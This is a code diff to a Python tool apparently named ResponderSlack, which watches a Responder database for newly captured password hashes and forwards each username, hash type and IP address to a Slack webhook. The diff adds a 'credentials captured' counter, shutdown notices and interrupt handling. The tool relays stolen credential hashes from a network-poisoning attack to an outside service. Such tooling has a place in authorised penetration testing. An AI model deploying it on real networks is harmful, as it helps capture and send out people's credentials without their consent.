@@ -1,9 +1,15 @@
 from time import sleep
-import requests, sqlite3, json, datetime, logging, socket
+import requests, sqlite3, json, datetime, logging, socket, sys
 
 # Configure logging for database operations
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
+
+# Session statistics
+sessionStats = {
+    'credentialsCaptured': 0,
+    'startTime': None
+}
 
 def getTimestamp():
     """Get formatted timestamp for console output."""
@@ -113,7 +119,7 @@ def checkNewHash(cursor, lastTime):
         return []
 
 def sendHash():
-    global lastTime, hookPayload
+    global lastTime, hookPayload, sessionStats
     result = checkNewHash(cursor,lastTime)
     if result:
         # Loop over each result
@@ -135,6 +141,9 @@ def sendHash():
             # Print to console and send webhook
             printWithTimestamp(f"New hash captured - User: {i[0]}, Type: {i[1]}, IP: {i[2]}")
             sendWebhook(hookPayload)
+
+            # Increment session statistics
+            sessionStats['credentialsCaptured'] += 1
         return True
     else:
         return False
@@ -163,6 +172,35 @@ def sendStartupNotification():
     sendWebhook(startupPayload)
     printWithTimestamp(f"ResponderSlack started on {hostname} - Listening for new hashes...")
 
+def sendShutdownNotification():
+    """Send a webhook notification that ResponderSlack is shutting down."""
+    hostname = socket.gethostname()
+    uptime = datetime.datetime.now() - sessionStats['startTime']
+    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
+    minutes, seconds = divmod(remainder, 60)
+    uptime_str = f"{hours}h {minutes}m {seconds}s"
+
+    shutdownPayload = {
+        "blocks": [
+            {
+                "type": "header",
+                "text": {
+                    "type": "plain_text",
+                    "text": "🔴 ResponderSlack Stopped"
+                }
+            },
+            {
+                "type": "section",
+                "text": {
+                    "type": "mrkdwn",
+                    "text": f"ResponderSlack is no longer listening for new hashes.\n*Hostname:* {hostname}\n*Stopped at:* {getTimestamp()}\n*Session uptime:* {uptime_str}\n*Credentials captured:* {sessionStats['credentialsCaptured']}"
+                }
+            }
+        ]
+    }
+    sendWebhook(shutdownPayload)
+    printWithTimestamp(f"ResponderSlack stopped on {hostname}")
+
 def loadConfig():
     global hookPayload, respDB, webhook, sleepTime, retrieveHash, discardDupes, botToken
 
@@ -183,20 +221,69 @@ def loadConfig():
         raise ValueError("Must add webhook URL in config.json!")
 
 def main():
-    global cursor, lastTime
+    global cursor, lastTime, sessionStats
 
     loadConfig()
     cursor = DbConnect(respDB)
     lastTime = datetime.datetime.now(datetime.UTC)
 
+    # Initialize session statistics
+    sessionStats['startTime'] = datetime.datetime.now()
+    sessionStats['credentialsCaptured'] = 0
+
     # Send startup notification
     sendStartupNotification()
 
-    while True:
-        checkHash = sendHash()
-        if checkHash:
-            lastTime = datetime.datetime.now(datetime.UTC)
-        sleep(sleepTime)
+    try:
+        while True:
+            checkHash = sendHash()
+            if checkHash:
+                lastTime = datetime.datetime.now(datetime.UTC)
+            sleep(sleepTime)
+
+    except KeyboardInterrupt:
+        # Handle Ctrl+C gracefully
+        print("\n")  # New line after ^C
+        printWithTimestamp("Interrupt received. Do you want to stop ResponderSlack?")
+
+        try:
+            response = input("Type 'yes' to confirm shutdown (or anything else to continue): ").strip().lower()
+
+            if response == 'yes':
+                # Display session statistics
+                printWithTimestamp("=" * 50)
+                printWithTimestamp(f"Session Statistics:")
+                printWithTimestamp(f"  Credentials captured: {sessionStats['credentialsCaptured']}")
+
+                uptime = datetime.datetime.now() - sessionStats['startTime']
+                hours, remainder = divmod(int(uptime.total_seconds()), 3600)
+                minutes, seconds = divmod(remainder, 60)
+                printWithTimestamp(f"  Session uptime: {hours}h {minutes}m {seconds}s")
+                printWithTimestamp("=" * 50)
+
+                # Send shutdown notification
+                sendShutdownNotification()
+
+                # Close database connection
+                if cursor:
+                    cursor.close()
+                    printWithTimestamp("Database connection closed")
+
+                printWithTimestamp("ResponderSlack shutdown complete")
+                sys.exit(0)
+            else:
+                printWithTimestamp("Shutdown cancelled. Resuming monitoring...")
+                # Resume the main loop
+                main()
+
+        except KeyboardInterrupt:
+            # If user presses Ctrl+C during confirmation prompt, force shutdown
+            print("\n")
+            printWithTimestamp("Forced shutdown initiated...")
+            sendShutdownNotification()
+            if cursor:
+                cursor.close()
+            sys.exit(0)
 
 if __name__ == "__main__":
     main()
